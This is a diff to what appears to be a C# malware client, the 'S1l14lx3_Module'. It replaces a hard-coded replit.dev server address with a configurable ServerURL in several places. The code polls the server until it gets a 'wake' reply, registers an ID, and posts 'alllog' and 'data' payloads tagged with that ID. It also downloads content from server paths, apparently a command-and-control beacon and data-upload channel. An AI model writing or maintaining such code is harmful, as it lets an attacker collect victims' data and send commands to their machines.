@@ -46,7 +46,7 @@ public class Program
         bool Server = false;
         while (!Server)
         {
-            string res = await S1l14lx3_Module.RAW_POST("https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", "wake");
+            string res = await S1l14lx3_Module.RAW_POST(Import.ServerURL, "wake");
             if (res == "wake")
             {
                 Server = true;
@@ -449,7 +449,7 @@ public class S1l14lx3_Module
         using (HttpClient httpClient = new HttpClient())
         {
             StringContent content = new StringContent($"s1l14lx3:add:{id}", Encoding.UTF8, "text/plain");
-            HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
+            HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
             cnt = await response.Content.ReadAsStringAsync();
         }
         return cnt;
@@ -473,7 +473,7 @@ public class S1l14lx3_Module
             using (HttpClient httpClient = new HttpClient())
             {
                 StringContent content = new StringContent($"s1l14lx3:alllog:{Data}", Encoding.UTF8, "text/plain");
-                HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
+                HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
                 cnt = await response.Content.ReadAsStringAsync();
             }
             return cnt;
@@ -491,7 +491,7 @@ public class S1l14lx3_Module
             using (HttpClient httpClient = new HttpClient())
             {
                 StringContent content = new StringContent($"s1l14lx3:data:{Import.ID}:{Data}", Encoding.UTF8, "text/plain");
-                HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
+                HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
                 cnt = await response.Content.ReadAsStringAsync();
             }
             return cnt;
@@ -537,7 +537,7 @@ public class S1l14lx3_Module
             using (HttpClient httpClient = new HttpClient())
             {
                 WebClient web = new WebClient();
-                string raw = web.DownloadString("https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev" + URL);
+                string raw = web.DownloadString(Import.ServerURL + URL);
                 string contentType = web.ResponseHeaders["Content-Type"];
                 bool isTextPlain = contentType != null && contentType.StartsWith("text/plain");
                 if (!isTextPlain)
